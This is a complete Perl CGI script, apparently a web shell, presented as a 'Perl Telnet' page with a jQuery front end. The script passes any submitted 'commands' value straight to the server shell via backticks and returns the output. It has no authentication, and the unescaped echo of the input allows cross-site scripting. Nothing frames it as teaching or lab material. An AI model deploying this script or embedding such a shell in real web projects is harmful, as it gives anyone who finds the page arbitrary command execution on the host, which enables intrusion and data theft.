#!/usr/bin/perl -w
#

use strict;
use CGI::Carp qw(fatalsToBrowser);
use CGI ':standard';

my $query = new CGI;
my $html  = $query->header('-type' => 'text/html', '-charset' => 'utf-8');
if ($query->param('commands')) {
    my $commands = $query->param('commands');
    $html .= '<pre>'. $commands .'</pre>';
    $html .= '<pre>'.`$commands`.'</pre>';
    print $html;
    exit;
    }
$html .= << 'END';
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Perl Telnet</title>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
    <style type="text/css">
        body {
            background:     #cccccc;
            color:          #ffffff;
            font-family:    'courier new';
            font-size:      10px;
            }
        #commands {
            background:     #333333;
            color:          #ffffff;
            width:          100%;
            height:         20%;
            }
        #screen {
            background:     #333333;
            color:          #ffffff;
            width:          100%;
            height:         75%;
            overflow:       scroll;
            }
    </style>
</head>
<body>
<div id="screen">
</div>
<form id="telnet" action="telnet.cgi" method="post">
    <textarea id="commands" name="commands"></textarea>
    <input id="submit" type="submit" value="Submit" />
</form>
<script type="text/javascript">
$(document).ready(function() {
    $("#submit").click(function() {
        $.ajax({
            type:    "POST",
            url:     "",
            data:    "commands="+escape($('#commands').val()),
            success:  function (html) {
                            $('#screen').append(html);
                            $('#commands').prop("value", "");
                            }
            });
        return false;
        });
    });
</script>
</body>
</html>
END
print $html;
exit;
